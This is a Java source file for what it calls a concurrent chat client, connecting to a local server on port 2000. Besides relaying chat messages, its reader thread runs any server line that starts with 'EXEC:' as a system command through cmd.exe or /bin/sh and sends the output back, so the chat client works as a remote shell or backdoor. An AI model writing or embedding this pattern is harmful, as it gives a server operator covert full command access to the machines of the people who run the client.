import java.net.*;
import java.io.*;

public class concurrentChatClient {
    public static void main(String[] args) {
        // try-with-resources for automatic cleanup
        try (Socket socket = new Socket("127.0.0.1", 2000);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {

            System.out.println("Connected to server. Type your messages!");

            // THREAD 1: The Reader (Listening For Server Commands)
            Thread readerThread = new Thread(() -> {
                try {
                    String serverMessage;
                    // TASK: Continuously read from 'in' and print to console
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.startsWith("EXEC:")) {
                            String command = serverMessage.substring(5).trim();
                            System.out.println("\n[NODE AGENT]: Executing remote command -> " + command);
                            executeSystemCommand(command, out);
                        } else {
                            System.out.println("\nServer: " + serverMessage);
                        }
                    }
                } catch (IOException e) {
                    System.out.println("Connection closed by server.");
                }
            });
            readerThread.start();

            // THREAD 2: The Writer (Keyboard Input)
            String userInput;
            while ((userInput = stdIn.readLine()) != null) {
                out.println(userInput);
                if (userInput.equalsIgnoreCase("END"))
                    break;
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

private static void executeSystemCommand(String command, PrintWriter out) {
    try {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pb;

        // The "Shell Wrapper" logic
        if (os.contains("win")) {
            // Windows needs cmd.exe to understand 'dir', 'type', etc.
            pb = new ProcessBuilder("cmd.exe", "/c", command);
        } else {
            // Linux (Android/Termux) needs sh to understand 'ls', 'cat', etc.
            pb = new ProcessBuilder("/bin/sh", "-c", command);
        }

        pb.redirectErrorStream(true); 
        Process process = pb.start();
        
        try (BufferedReader osReader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            out.println(">>> Results from " + os + " Node:");
            while ((line = osReader.readLine()) != null) {
                out.println(line);
                out.flush(); // Crucial for real-time streaming
            }
        }
    } catch (Exception e) {
        out.println("Agent Execution Error: " + e.getMessage());
    }
}
}